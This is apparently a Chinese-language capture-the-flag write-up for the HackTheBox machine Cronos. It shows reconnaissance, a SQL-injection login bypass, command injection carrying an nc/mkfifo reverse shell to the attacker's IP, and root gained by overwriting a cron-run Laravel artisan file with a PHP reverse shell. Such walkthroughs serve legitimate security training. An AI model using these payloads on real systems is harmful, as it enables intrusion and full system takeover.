kali 10.10.16.5

靶机 10.10.10.13



```bash
└─# ports=$(nmap -p- -sS -n --min-rate=1000 $ip | grep -oE '(^[0-9][^/tcp]*)' | tr '\n' ',')
```

```bash
└─# nmap -p$ports -sV -sC -O $ip -oN nmap.txt
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18b973826f26c7788f1b3988d802cee8 (RSA)
|   256 1ae606a6050bbb4192b028bf7fe5963b (ECDSA)
|_  256 1a0ee7ba00cc020104cda3a93f5e2220 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.8 (95%), Linux 4.4 (95%), Linux 4.9 (95%), Linux 4.2 (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



53：DNS

[53 - Pentesting DNS - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns)

[Cronos - HTB - Writeup - 14mC4's Blog](https://14mc4.github.io/blog/2023/01/09/cronos-htb-writeup/)

```bash
└─# nslookup
> server 10.10.10.13
Default server: 10.10.10.13
Address: 10.10.10.13#53
> 10.10.10.13
;; communications error to 10.10.10.13#53: timed out
13.10.10.10.in-addr.arpa	name = ns1.cronos.htb.
```

```bash
└─# dig axfr @10.10.10.13
```

先绑定 host

```
echo "10.10.10.13 cronos.htb" >> /etc/hosts 
echo "10.10.10.13 ns1.cronos.htb" >> /etc/hosts 
```

再子域名枚举

```bash
└─# wfuzz -H 'HOST: FUZZ.cronos.htb' -u 'http://10.10.10.13' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hw 397,975
```

```
000000186:   200        85 L     137 W      2319 Ch     "www - www"                                   
000000259:   200        56 L     139 W      1547 Ch     "admin - admin"  
```

再绑定hosts

```
echo "10.10.10.13 www.cronos.htb admin.cronos.htb" >> /etc/hosts 
```

首先看到了一个登录框

<img src=".\图片\Snipaste_2023-09-05_10-34-02.png" alt="Snipaste_2023-09-05_10-34-02" style="zoom:80%;" />

web：

弱口令

```
admin'||'1'='1
123
```

命令执行

```
8.8.8.8;whoami
```

<img src=".\图片\Snipaste_2023-09-05_10-38-29.png" alt="Snipaste_2023-09-05_10-38-29" style="zoom:80%;" />





反弹shell

```
8.8.8.8;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.5 1234 >/tmp/f
```

```bash
└─# nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.13] 59414
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 8.8.8.8
/bin/sh: 2: 8.8.8.8: not found
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@cronos:/var/www/admin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@cronos:/var/www/admin$ ls
ls
config.php  index.php  logout.php  session.php	welcome.php
```



提权



```bash
www-data@cronos:/var/www/admin$ cat config.php
cat config.php
<?php
   define('DB_SERVER', 'localhost');
   define('DB_USERNAME', 'admin');
   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
   define('DB_DATABASE', 'admin');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
?>
```

```bash
mysql> select * from users;
select * from users;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | 4f5fffa7b2340178a716e3832451e058 |
+----+----------+----------------------------------+
```

解密后

```
admin:1327663704
```



```bash
www-data@cronos:/$ ls -alh /etc/*cron*
ls -alh /etc/*cron*
-rw-r--r-- 1 root root  797 Apr  9  2017 /etc/crontab

/etc/cron.d:
total 24K
drwxr-xr-x  2 root root 4.0K May 10  2022 .
drwxr-xr-x 95 root root 4.0K May 10  2022 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder
-rw-r--r--  1 root root  589 Jul 16  2014 mdadm
-rw-r--r--  1 root root  670 Mar  1  2016 php
-rw-r--r--  1 root root  191 Mar 22  2017 popularity-contest

/etc/cron.daily:
total 60K
drwxr-xr-x  2 root root 4.0K May 10  2022 .
drwxr-xr-x 95 root root 4.0K May 10  2022 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder
-rwxr-xr-x  1 root root  539 Apr  6  2016 apache2
-rwxr-xr-x  1 root root  376 Mar 31  2016 apport
-rwxr-xr-x  1 root root 1.5K Jan 17  2017 apt-compat
-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
-rwxr-xr-x  1 root root 1.6K Nov 27  2015 dpkg
-rwxr-xr-x  1 root root  372 May  6  2015 logrotate
-rwxr-xr-x  1 root root 1.3K Nov  6  2015 man-db
-rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm
-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate
-rwxr-xr-x  1 root root  249 Nov 13  2015 passwd
-rwxr-xr-x  1 root root 3.4K Feb 26  2016 popularity-contest
-rwxr-xr-x  1 root root  214 May 24  2016 update-notifier-common

/etc/cron.hourly:
total 12K
drwxr-xr-x  2 root root 4.0K May 10  2022 .
drwxr-xr-x 95 root root 4.0K May 10  2022 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder

/etc/cron.monthly:
total 12K
drwxr-xr-x  2 root root 4.0K May 10  2022 .
drwxr-xr-x 95 root root 4.0K May 10  2022 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder

/etc/cron.weekly:
total 24K
drwxr-xr-x  2 root root 4.0K May 10  2022 .
drwxr-xr-x 95 root root 4.0K May 10  2022 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder
-rwxr-xr-x  1 root root   86 Apr 13  2016 fstrim
-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  211 May 24  2016 update-notifier-common
```

```bash
www-data@cronos:/$ cd /etc/cron.d
cd /etc/cron.d
www-data@cronos:/etc/cron.d$ ls
ls
mdadm  php  popularity-contest
www-data@cronos:/etc/cron.d$ cat php
cat php
# /etc/cron.d/php@PHP_VERSION@: crontab fragment for PHP
#  This purges session files in session.save_path older than X,
#  where X is defined in seconds as the largest value of
#  session.gc_maxlifetime from all your SAPI php.ini files
#  or 24 minutes if not defined.  The script triggers only
#  when session.save_handler=files.
#
#  WARNING: The scripts tries hard to honour all relevant
#  session PHP options, but if you do something unusual
#  you have to disable this script and take care of your
#  sessions yourself.

# Look for and purge old sessions every 30 minutes
09,39 *     * * *     root   [ -x /usr/lib/php/sessionclean ] && /usr/lib/php/sessionclean
www-data@cronos:/etc/cron.d$ ls -al /usr/lib/php/sessionclean
ls -al /usr/lib/php/sessionclean
-rwxr-xr-x 1 root root 2918 Mar  1  2016 /usr/lib/php/sessionclean
```



现在情况明确了

```bash
www-data@cronos:/etc/cron.d$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * *	root	php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
#
```

```bash
www-data@cronos:/etc/cron.d$ ls -al /var/www/laravel/artisan
ls -al /var/www/laravel/artisan
-rwxr-xr-x 1 www-data www-data 1646 Apr  9  2017 /var/www/laravel/artisan
www-data@cronos:/etc/cron.d$ cat /var/www/laravel/artisan
cat /var/www/laravel/artisan
#!/usr/bin/env php
<?php

/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader
| for our application. We just need to utilize it! We'll require it
| into the script here so that we do not have to worry about the
| loading of any our classes "manually". Feels great to relax.
|
*/

require __DIR__.'/bootstrap/autoload.php';

$app = require_once __DIR__.'/bootstrap/app.php';

/*
|--------------------------------------------------------------------------
| Run The Artisan Application
|--------------------------------------------------------------------------
|
| When we run the console application, the current CLI command will be
| executed in this console and the response sent back to a terminal
| or another output device for the developers. Here goes nothing!
|
*/

$kernel = $app->make(Illuminate\Contracts\Console\Kernel::class);

$status = $kernel->handle(
    $input = new Symfony\Component\Console\Input\ArgvInput,
    new Symfony\Component\Console\Output\ConsoleOutput
);

/*
|--------------------------------------------------------------------------
| Shutdown The Application
|--------------------------------------------------------------------------
|
| Once Artisan has finished running. We will fire off the shutdown events
| so that any final work may be done by the application before we shut
| down the process. This is the last thing to happen to the request.
|
*/

$kernel->terminate($input, $status);

exit($status);
```

```bash
echo '<?php $sock = fsockopen("10.10.16.5",4321);$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);?>' > /var/www/laravel/artisan
```

```bash
└─# nc -lvnp 4321            
listening on [any] 4321 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.13] 45194
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
df6bac5dd0600d9eab91f70f09b40b4e
```



总结：53端口注意 域名 枚举，子域名爆破



[HTB： Cronos渗透测试 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/265393.html)

[Cronos - HTB - Writeup - 14mC4's Blog](https://14mc4.github.io/blog/2023/01/09/cronos-htb-writeup/)






